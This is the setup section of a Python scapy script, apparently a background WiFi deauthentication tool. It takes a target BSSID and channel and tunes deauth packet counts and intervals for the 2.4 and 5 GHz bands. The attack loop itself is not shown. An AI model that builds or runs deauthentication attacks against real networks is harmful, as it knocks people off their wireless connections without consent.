#!/usr/bin/env python3

import sys, time, os, subprocess
from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp, sniff, Dot11ProbeReq, Dot11Auth, Dot11AssoReq
from datetime import datetime

# Validate arguments
if len(sys.argv) != 5:
    print("Usage: python3 background_deauth.py <iface> <bssid> <channel> <logfile>")
    sys.exit(1)

iface, bssid, channel, logfile = sys.argv[1:5]

# Enhanced Configuration
whitelist = ["00:11:22:33:44:55"]  # Add your MAC if needed
clients_seen = set()
active_clients = set()

# Band-specific timing
BAND = '2.4' if int(channel) <= 14 else '5'
deauth_count = 7 if BAND == '2.4' else 5       # More packets for 2.4GHz
deauth_interval = 0.1 if BAND == '2.4' else 0.15 # Slightly slower for 5GHz
scan_interval = 3
sniff_timeout = 2

# Ensure log directory exists
os.makedirs(os.path.dirname(logfile), exist_ok=True)